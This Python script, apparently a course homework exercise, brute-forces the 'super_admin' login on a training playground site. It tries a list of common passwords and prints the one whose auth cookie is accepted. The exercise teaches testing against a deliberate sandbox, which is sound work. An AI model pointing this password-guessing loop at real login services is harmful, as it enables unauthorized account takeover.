import requests

pw = ['password', 123456, 123456789, 12345678, 12345, 'qwerty', 'abc123', 'football', 1234567, 'monkey', 111111, 'letmein', 1234567890, 'dragon', 'baseball', 1234, 'sunshine', 'iloveyou', 'trustno1', 'princess', 'adobe123', 123123, 'welcome', 'admin', 'qwerty123', 'solo', '1q2w3e4r', '!@#$%^&*', 'master', 'login', 666666, 'photoshop', '1qaz2wsx', 'qwertyuiop', 'ashley', 'mustang', 121212, 'starwars', 654321, 'bailey', 'access', 'flower', 555555, 'passw0rd', 'shadow', 'lovely', 'michael', 'jesus', 'password1', 'superman', 'hello', 'charlie', 888888, 'hottie', 'freedom', 'aa123456', 'qazwsx', 'ninja', 'azerty', 'loveme', 'whatever', 'donald', 'batman', 'zaq1zaq1', 000000, '123qwe', 696969, 'Football']

for i in pw:
    login = "super_admin"
    payload = {"login": f"{login}", "password": f"{i}"}
    response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=payload)
    auth_cookie = response.cookies.get("auth_cookie")
    payload = {"auth_cookie": f"{auth_cookie}"}
    response = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=payload)
    if response.text == "You are authorized":
        print(f"login: {login}, password: {i}")
        print(response.text)
